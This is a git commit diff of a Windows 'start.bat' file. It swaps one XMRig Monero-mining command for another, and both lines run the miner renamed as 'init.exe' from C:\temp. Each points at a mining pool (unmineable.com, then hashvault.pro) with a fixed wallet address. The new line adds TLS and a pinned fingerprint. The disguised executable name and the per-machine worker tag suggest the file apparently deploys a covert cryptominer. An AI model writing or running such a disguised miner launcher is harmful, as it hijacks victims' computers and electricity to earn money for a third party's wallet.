89e26290764bb85ac14b087a57e8791af2ecadba
nmshare <128151412+nmshare@users.noreply.github.com>
2023-04-16 14:07:08 +0300

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,1 +1,1 @@
-C:\temp\xmrig\xmrig-6.19.0\init.exe -o rx.unmineable.com:80 -a rx -k -u XMR:425v8KdSdJ2ZxT5zCGbFWybd4tACtRLASMegDgWr39EUhJAj5Hcx2Zk1M1Ww1HaQQ2aoumHtgRvkVBiafbGeTaUq9QW4HKE.$name -p x
+C:\temp\xmrig\xmrig-6.19.0\init.exe --url pool.hashvault.pro:80 --user 425v8KdSdJ2ZxT5zCGbFWybd4tACtRLASMegDgWr39EUhJAj5Hcx2Zk1M1Ww1HaQQ2aoumHtgRvkVBiafbGeTaUq9QW4HKE --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
